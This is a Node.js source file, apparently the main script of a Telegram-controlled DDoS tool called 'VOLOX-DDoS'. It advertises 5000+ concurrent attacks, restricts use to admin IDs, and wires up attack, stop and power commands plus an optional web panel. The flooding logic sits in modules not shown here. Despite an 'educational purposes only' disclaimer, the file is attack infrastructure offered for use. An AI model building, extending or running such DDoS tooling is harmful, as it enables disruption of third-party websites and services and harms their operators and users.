const TelegramBot = require('node-telegram-bot-api');
const config = require('./config');
const AttackManager = require('./attack-manager');
const Logger = require('./utils/logger');
const chalk = require('chalk');
const figlet = require('figlet');

// Initialize logger
const logger = new Logger(config.system.logLevel);

// Banner
console.log(chalk.red(figlet.textSync('VOLOX-DDoS', { horizontalLayout: 'full' })));
console.log(chalk.yellow('╔══════════════════════════════════════════════════════════╗'));
console.log(chalk.yellow('║                    NODE 22 ARCHITECTURE                  ║'));
console.log(chalk.yellow('║             5000+ Concurrent Attack Capacity             ║'));
console.log(chalk.yellow('║                Termux / Panel / VSCode Ready             ║'));
console.log(chalk.yellow('╚══════════════════════════════════════════════════════════╝\n'));

// Initialize bot
const bot = new TelegramBot(config.telegram.token, {
  polling: config.telegram.polling
});

// Initialize attack manager
const attackManager = new AttackManager(config.attack.maxConcurrent);

// Load commands
const attackCommands = require('./commands/attack-commands')(bot, attackManager, config);
const adminCommands = require('./commands/admin-commands')(bot, attackManager, config);

// Start message
bot.onText(/\/start/, (msg) => {
  const userId = msg.from.id;
  
  if (!config.telegram.adminIds.includes(userId.toString())) {
    bot.sendMessage(msg.chat.id, "❌ Unauthorized access.");
    return;
  }
  
  const menu = `
${chalk.bold('⚡ VOLOX DDoS Bot v2.0 ⚡')}

${chalk.green('📊 STATS')}
• Active Attacks: ${attackManager.getActiveCount()}
• Max Capacity: ${config.attack.maxConcurrent}
• Uptime: ${process.uptime().toFixed(2)}s

${chalk.cyan('📋 COMMANDS')}
/attack - Launch attack
/menu - Show attack menu
/status - System status
/stop [id] - Stop attack
/stop_all - Stop all attacks
/stats - Attack statistics
/power [on/off] - Toggle system
/help - Show help

${chalk.yellow('⚠️  WARNING')}
Use with caution. This tool is for educational purposes only.
  `;
  
  bot.sendMessage(msg.chat.id, menu, { parse_mode: 'HTML' });
});

// Error handling
bot.on('polling_error', (error) => {
  logger.error(`Polling error: ${error.message}`);
});

bot.on('webhook_error', (error) => {
  logger.error(`Webhook error: ${error.message}`);
});

// Start web panel if enabled
if (config.panel.enabled) {
  require('./start-panel')(config, attackManager);
}

logger.info(`Bot started successfully. Admin IDs: ${config.telegram.adminIds.join(', ')}`);
logger.info(`Maximum concurrent attacks: ${config.attack.maxConcurrent}`);
